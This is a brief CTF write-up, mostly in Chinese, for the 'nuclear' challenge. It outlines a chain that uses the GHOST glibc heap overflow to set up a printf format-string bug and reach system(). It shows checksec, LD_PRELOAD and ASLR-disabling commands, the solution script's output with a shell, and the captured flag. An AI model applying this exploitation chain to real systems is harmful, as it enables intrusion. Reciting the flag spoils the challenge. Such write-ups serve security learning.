先使用ghost漏洞（cve-20150235）溢出堆，覆盖堆块中的函数指针，
由于使用scanf获取用户输入，因此存在一些坏字符：        scanf_bad_chars = ['\x09','\x0a','\x0b','\x0c','\x0d','\x20']
由于got(system)含有坏字符，导致无法直接利用程序中的system函数got地址覆盖目标函数指针，
但是got(printf)不含任何坏字符，可以将got(printf)覆盖为nuke的函数地址，这样就构造出了printf的格式化漏洞，
最后通过printf格式化漏洞将堆中nuke函数指针写为got(system)地址


checksec --file nuclear
        RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
        Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   nuclear





root@localhost:~/Desktop/nuclear# export LD_PRELOAD=/root/Desktop/nuclear/x86_64_libc.so.6 
root@localhost:~/Desktop/nuclear# ldd ./nuclear
	linux-vdso.so.1 =>  (0x00007fff075fe000)
	/root/Desktop/nuclear/x86_64_libc.so.6 (0x00007f9effdd0000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f9f00192000)


and for debug:	 disable system ASLR

root@localhost:~/Desktop/nuclear# sysctl -w kernel.randomize_va_space=0





root@localhost:~/Desktop/nuclear/solution# py nuclear.py 
[+] heap_base    @   0x9be000
[+] func_list    @   0x9be810
[+] help_fn_ptr  @   0x9be810
[+] nuke_fn_ptr  @   0x9be818
[+] bye_fn_ptr   @   0x9be820
printf format exploit
[*] open shell>
id
uid=1061(nuclear) gid=1061(nuclear) groups=1061(nuclear)
cat /home/nuclear/flag
Get_HOST_by_name says : nuclear launch detected!



flag:
Get_HOST_by_name says : nuclear launch detected!